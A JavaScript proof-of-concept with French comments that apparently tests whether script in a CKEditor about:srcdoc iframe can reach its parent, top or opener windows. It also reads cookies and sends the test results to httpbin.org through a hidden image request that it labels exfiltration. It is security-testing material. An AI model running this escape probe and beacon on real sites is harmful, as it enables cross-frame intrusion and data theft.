// script_inoffensif.js
(function() {
    // En-tête claire pour identification
    console.log('[CKEditor Test] Test de confinement about:srcdoc - ' + new Date().toISOString());
    
    // Variables pour suivre le succès
    let accessLevel = 'none';
    
    try {
        // Méthode 1: Accès direct au parent
        if (window.parent && window.parent !== window) {
            console.log('[Test 1] Tentative accès direct parent...');
            window.parent.document.body.style.backgroundColor = 'red';
            accessLevel = 'direct_parent';
            console.log('[SUCCÈS] Accès direct au parent possible!');
        }
    } catch(e) {
        console.log('[ÉCHEC Test 1] Accès direct bloqué:', e.message);
        
        try {
            // Méthode 2: Via postMessage avec coordination
            console.log('[Test 2] Tentative via postMessage...');
            
            // Écouter la réponse
            window.addEventListener('message', function(event) {
                // Vérifier l'origine pour la sécurité
                console.log('[postMessage] Message reçu:', event.data);
            });
            
            // Envoyer un message au parent
            window.parent.postMessage({
                type: 'testAccess',
                request: 'changeBackground',
                color: 'red'
            }, '*');
            
            accessLevel = 'postmessage_attempted';
            
        } catch(e2) {
            console.log('[ÉCHEC Test 2] postMessage échoué:', e2.message);
            
            try {
                // Méthode 3: Accès au top window
                console.log('[Test 3] Tentative accès top window...');
                if (window.top && window.top !== window) {
                    window.top.document.body.style.backgroundColor = 'red';
                    accessLevel = 'top_window';
                    console.log('[SUCCÈS] Accès top window possible!');
                }
            } catch(e3) {
                console.log('[ÉCHEC Test 3] Accès top window bloqué:', e3.message);
                
                // Méthode 4: Tenter via des références d'ouverture
                try {
                    console.log('[Test 4] Test références d\'ouverture...');
                    if (window.opener) {
                        window.opener.document.body.style.backgroundColor = 'red';
                        accessLevel = 'opener';
                        console.log('[SUCCÈS] Accès via opener possible!');
                    }
                } catch(e4) {
                    console.log('[ÉCHEC Test 4] Opener bloqué:', e4.message);
                }
            }
        }
    }
    
    // Tester l'accès aux cookies (en lecture seule)
    try {
        const cookies = document.cookie;
        console.log('[Info] Cookies dans ce contexte:', cookies || '(aucun ou inaccessible)');
    } catch(e) {
        console.log('[Info] Lecture cookies impossible');
    }
    
    // Afficher les informations de contexte
    console.log('[Contexte] Origin:', window.location.origin);
    console.log('[Contexte] Protocol:', window.location.protocol);
    console.log('[Contexte] Host:', window.location.host);
    console.log('[Contexte] URL complète:', window.location.href);
    
    // Vérifier si on est dans une iframe
    console.log('[Contexte] Dans iframe?:', window.self !== window.top);
    
    // Tester la communication vers l'extérieur (pour POC)
    try {
        // Créer une requête image pour exfiltrer les résultats
        const testResult = {
            accessLevel: accessLevel,
            origin: window.location.origin,
            timestamp: Date.now(),
            isIframe: window.self !== window.top
        };
        
        const img = new Image();
        img.src = 'https://httpbin.org/get?test=' + encodeURIComponent(JSON.stringify(testResult));
        img.style.display = 'none';
        
        // Timeout pour éviter de bloquer
        setTimeout(() => {
            document.body.appendChild(img);
            setTimeout(() => img.remove(), 1000);
        }, 500);
        
        console.log('[Test] Résultats envoyés à httpbin (lecture seule)');
        
    } catch(exfilError) {
        console.log('[Info] Exfiltration bloquée (normal)');
    }
    
    // Résumé final
    const summary = `
    === RÉSUMAT DU TEST CKEditor ===
    Niveau d'accès: ${accessLevel}
    Contexte: ${window.location.origin}
    Iframe: ${window.self !== window.top ? 'OUI' : 'NON'}
    Test terminé à: ${new Date().toISOString()}
    ===
    `;
    
    console.log(summary);
    
    // Créer un élément visible dans l'iframe pour confirmer l'exécution
    const indicator = document.createElement('div');
    indicator.innerHTML = `
        <div style="
            position: fixed;
            top: 10px;
            right: 10px;
            background: #${accessLevel === 'none' ? 'f00' : '0f0'};
            color: white;
            padding: 5px 10px;
            border-radius: 3px;
            font-family: monospace;
            font-size: 12px;
            z-index: 999999;
            opacity: 0.8;
        ">
            Test: ${accessLevel}
        </div>
    `;
    
    document.body.appendChild(indicator);
    
    // Nettoyer après 10 secondes
    setTimeout(() => {
        if (indicator.parentNode) {
            indicator.parentNode.removeChild(indicator);
        }
        console.log('[Test] Nettoyage effectué');
    }, 10000);
    
})();
